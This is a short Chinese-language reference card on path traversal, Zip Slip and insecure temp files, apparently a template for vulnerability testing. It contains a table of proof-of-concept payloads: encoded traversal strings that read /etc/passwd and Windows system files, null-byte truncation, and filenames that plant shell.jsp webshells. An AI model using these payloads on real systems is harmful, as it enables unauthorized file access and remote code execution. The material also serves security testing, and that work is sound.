# Path Traversal Family（Path Traversal / Zip Slip / Insecure Temp File）

## 共性

文件路径接收外部输入时，`../` 序列让攻击者跳出预期目录，读写任意文件。
**写入**场景比读取更严重（可能覆盖 webshell / 配置 → RCE）。

## PoC 模板

| 攻击目标 | poc_payload |
|---|---|
| 读 /etc/passwd | `filename=../../../../etc/passwd` |
| Windows 系统文件 | `filename=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts` |
| URL 编码绕过 | `filename=..%2F..%2F..%2Fetc%2Fpasswd` |
| 双重 URL 编码 | `filename=..%252F..%252Fetc%252Fpasswd` |
| 空字节截断（旧 JDK） | `filename=../../../etc/passwd%00.jpg` |
| Zip Slip | ZIP 内含 entry name `../../../../var/www/html/shell.jsp` |
| 写入 webshell | upload filename=`../../webapps/ROOT/shell.jsp` |
